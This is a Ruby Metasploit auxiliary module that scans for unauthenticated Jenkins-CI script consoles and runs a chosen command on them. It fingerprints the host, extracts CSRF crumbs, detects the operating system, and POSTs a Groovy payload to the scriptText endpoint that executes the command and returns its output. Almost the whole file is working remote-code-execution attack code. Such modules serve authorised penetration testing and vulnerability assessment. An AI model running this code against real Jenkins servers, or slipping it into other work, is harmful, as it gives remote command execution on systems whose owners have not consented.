##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jenkins-CI Unauthenticated Script-Console Scanner',
        'Description' => %q{
          This module scans for unauthenticated Jenkins-CI script consoles and
          executes the specified command.
        },
        'Author' => [
          'altonjx',
          'Jeffrey Cap'
        ],
        'References' => [
          ['CVE', '2015-8103'], # see link and validate, https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/ states this is another issue
          ['URL', 'https://www.jenkins.io/security/advisory/2015-11-11/'],
          ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'],
          ['URL', 'https://www.jenkins.io/doc/book/managing/script-console/'],
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The path to the Jenkins-CI application', '/jenkins/' ]),
        OptString.new('COMMAND', [ true, 'Command to run in application', 'whoami' ]),
      ]
    )
  end

  def fingerprint_os(_ip)
    res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, 'systemInfo'), 'keep_cookies' => true })

    # Verify that we received a proper systemInfo response
    if res.nil? || res.body.to_s.empty?
      vprint_error('The server did not reply to our systemInfo request')
      return
    end

    html = res.get_html_document
    jenkins_response = res.headers['X-Jenkins'].present? || html.at_css('body#jenkins')
    if jenkins_response && [401, 403].include?(res.code)
      vprint_error('This Jenkins-CI system requires authentication')
      return
    end

    unless res.code == 200 && jenkins_response && res.body.include?('System Properties') && res.body.include?('Environment Variables')
      vprint_error("This system is not running Jenkins-CI at #{datastore['TARGETURI']}")
      return
    end

    host_info = {}
    if (crumb = html.at_css('[data-crumb-value]'))
      host_info[:crumb] = crumb['data-crumb-value']
      host_info[:crumb_name] = crumb['data-crumb-header'] || 'Jenkins-Crumb'
    elsif (match = res.body.match(/"\.crumb", "([a-z0-9]*)"/))
      host_info[:crumb] = match[1]
      host_info[:crumb_name] = '.crumb'
    elsif (match = res.body.match(/crumb\.init\("Jenkins-Crumb", "([a-z0-9]*)"\)/))
      host_info[:crumb] = match[1]
      host_info[:crumb_name] = 'Jenkins-Crumb'
    end
    if host_info[:crumb]
      vprint_status("Using CSRF field #{host_info[:crumb_name]}")
      host_info[:cookie] = res.get_cookies
    end

    row = html.css('tr').find { |entry| entry.css('> td').first&.text&.strip == 'os.name' }
    value_cell = row&.css('> td')&.[](1)
    os_name = (value_cell&.at_css('.app-hidden-info-hide') || value_cell)&.text&.strip
    if os_name.to_s.empty?
      vprint_error('The system information response did not contain the operating system name')
      return
    end

    host_info[:prefix] = os_name.start_with?('Windows') ? 'cmd.exe /c ' : ''
    host_info
  end

  def run_host(ip)
    host_info = fingerprint_os(ip)
    return if host_info.nil?

    command = datastore['COMMAND'].to_s.dup.force_encoding(::Encoding::UTF_8)
    unless command.valid_encoding?
      vprint_error('Command must contain valid UTF-8 text')
      return
    end

    request_parameters = {
      'uri' => normalize_uri(target_uri.path, 'scriptText'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' =>
        {
          'script' => command_script("#{host_info[:prefix]}#{command}"),
          'Submit' => 'Run'
        }
    }
    request_parameters['cookie'] = host_info[:cookie] unless host_info[:cookie].nil?
    request_parameters['vars_post'][host_info.fetch(:crumb_name, '.crumb')] = host_info[:crumb] unless host_info[:crumb].nil?
    res = send_request_cgi(request_parameters)

    unless res
      vprint_error('No response received while executing the command')
      return
    end

    unless res.code == 200
      vprint_error("Command execution returned HTTP #{res.code}")
      return
    end

    result = res.get_json_document
    if result.is_a?(Hash) && result['error'].is_a?(String)
      vprint_error("Command execution failed: #{result['error']}")
      return
    end

    unless result.is_a?(Hash) && result['stdout'].is_a?(String) && result['stderr'].is_a?(String) && result['exit_status'].is_a?(Integer)
      vprint_error('Command execution did not return a valid result')
      return
    end

    result['stdout'].each_line(chomp: true) { |line| print_good(line) }
    result['stderr'].each_line(chomp: true) { |line| vprint_error("Command stderr: #{line}") }
    vprint_status("Command completed with exit status #{result['exit_status']}")
    report_vulnerable(result['stdout'] + result['stderr'])
  end

  def command_script(command)
    # JSON string escaping also needs Groovy's dollar interpolation disabled.
    literal = command.to_json.gsub('$') { '\\$' }
    # scriptText avoids HTML decoding and output markers altering command data.
    # https://www.jenkins.io/doc/book/managing/script-console/#remote-access
    <<~GROOVY
      try {
        def sout = new ByteArrayOutputStream(), serr = new ByteArrayOutputStream()
        def proc = #{literal}.execute()
        def stdoutThread = proc.consumeProcessOutputStream(sout)
        def stderrThread = proc.consumeProcessErrorStream(serr)
        proc.waitForOrKill(1000)
        stdoutThread.join(1000)
        stderrThread.join(1000)
        if (stdoutThread.isAlive() || stderrThread.isAlive()) {
          throw new java.io.IOException('Command output did not close after execution')
        }
        println groovy.json.JsonOutput.toJson([stdout:sout.toString('UTF-8'), stderr:serr.toString('UTF-8'), exit_status:proc.exitValue()])
      } catch (java.io.IOException error) {
        println groovy.json.JsonOutput.toJson([error:error.getMessage()])
      }
    GROOVY
  end

  def report_vulnerable(result)
    report_vuln(
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :sname => ssl ? 'https' : 'http',
      :name => self.name,
      :info => result,
      :refs => self.references,
      :exploited_at => Time.now.utc
    )
  end
end
